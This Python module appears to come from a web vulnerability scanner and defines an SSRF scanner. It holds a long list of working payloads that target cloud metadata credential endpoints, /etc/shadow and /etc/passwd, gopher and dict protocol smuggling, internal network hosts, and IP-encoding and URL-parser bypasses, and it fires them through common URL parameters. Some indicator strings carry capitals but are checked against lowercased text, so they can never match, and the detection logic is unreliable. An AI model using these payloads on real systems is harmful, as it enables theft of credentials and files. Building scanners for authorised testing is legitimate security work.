from .base import BaseScanner, Vulnerability
from ..core.target import Target
from typing import List
import logging

logger = logging.getLogger(__name__)

class SSRFScanner(BaseScanner):
    """Scanner for Server-Side Request Forgery (SSRF) vulnerabilities"""
    
    # Comprehensive SSRF payload set for professional scanning
    PAYLOADS = [
        # AWS Cloud Metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",
        
        # GCP Cloud Metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
        "http://metadata/computeMetadata/v1/",
        
        # Azure Cloud Metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity?api-version=2021-02-01",
        
        # DigitalOcean Metadata
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1.json",
        
        # Alibaba Cloud Metadata
        "http://100.100.100.200/latest/meta-data/",
        
        # Localhost variations
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://[0:0:0:0:0:0:0:1]",
        
        # IP address bypass - Decimal notation
        "http://2130706433",  # 127.0.0.1 in decimal
        "http://3232235521",  # 192.168.0.1 in decimal
        
        # IP address bypass - Octal notation
        "http://0177.0.0.1",  # 127.0.0.1 in octal
        "http://0x7f.0.0.1",  # 127.0.0.1 in hex
        
        # IP address bypass - Mixed encoding
        "http://127.1",
        "http://127.0.1",
        "http://0",
        
        # Protocol handlers
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///etc/shadow",
        "file:///c:/windows/win.ini",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "gopher://127.0.0.1:25/_HELO",
        "dict://127.0.0.1:11211/stats",
        "ftp://127.0.0.1",
        "tftp://127.0.0.1",
        
        # Internal network scanning
        "http://192.168.0.1",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://internal.company.local",
        "http://intranet",
        
        # URL parser bypass techniques
        "http://127.0.0.1@example.com",
        "http://example.com@127.0.0.1",
        "http://127.0.0.1#@example.com",
        "http://127.0.0.1?@example.com",
        "http://example.com#127.0.0.1",
        
        # DNS rebinding patterns
        "http://localtest.me",  # Resolves to 127.0.0.1
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
        
        # Localhost alternatives
        "http://lvh.me",  # Resolves to 127.0.0.1
        "http://127.0.0.1.nip.io",
        
        # CIDR bypass
        "http://127.0.0.0/8",
        "http://0.0.0.0/0",
    ]
    
    INDICATORS = [
        "ami-id",
        "instance-id",
        "root:",
        "localhost",
        "private-ip",
        "metadata",
        "127.0.0.1",
        "security-credentials",
        "iam-info",
        "instance-identity",
        "user-data",
        "hostname",
        "computeMetadata",
        "GCE_METADATA",
        "Azure",
        "[extensions]",  # win.ini
        "bin/bash",
        "nobody:",
        "daemon:",
    ]
    
    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """Scan target for SSRF vulnerabilities with comprehensive payload testing"""
        vulnerabilities = []
        logger.info(f"Starting comprehensive SSRF scan on {target.url}")
        
        # Common parameter names for URLs
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'callback', 'return', 'page', 'continue', 'view', 'file', 'document', 'folder', 'root', 'pg', 'style', 'template', 'php_path', 'doc']
        
        payload_count = 0
        total_tests = len(self.PAYLOADS) * len(url_params)
        
        for payload in self.PAYLOADS:
            if callback:
                callback(payload)
            
            for param in url_params:
                payload_count += 1
                
                # Build test URL
                if '?' in target.url:
                    test_url = f"{target.url}&{param}={payload}"
                else:
                    test_url = f"{target.url}?{param}={payload}"
                
                try:
                    # Make request with timeout
                    response = self.session.get(test_url, timeout=3, allow_redirects=False)
                    
                    # Check for SSRF indicators in response
                    if response.status_code == 200 and response.text:
                        for indicator in self.INDICATORS:
                            if indicator in response.text.lower():
                                vuln = Vulnerability(
                                    name="Server-Side Request Forgery (SSRF)",
                                    description=f"The application makes requests to URLs provided by users without proper validation, potentially allowing access to internal resources. Parameter '{param}' is vulnerable.",
                                    severity="HIGH",
                                    evidence=f"Parameter: {param}, Payload: {payload}, Indicator found: {indicator}, Response preview: {response.text[:200]}",
                                    url=test_url
                                )
                                vulnerabilities.append(vuln)
                                logger.warning(f"SSRF vulnerability found at {test_url}")
                                
                                # Continue testing other payloads for comprehensive scan
                                break
                                
                except Exception as e:
                    logger.debug(f"Error testing SSRF payload {payload} on param {param}: {str(e)}")
                    continue
        
        logger.info(f"SSRF scan complete. Tested {payload_count} payload combinations. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
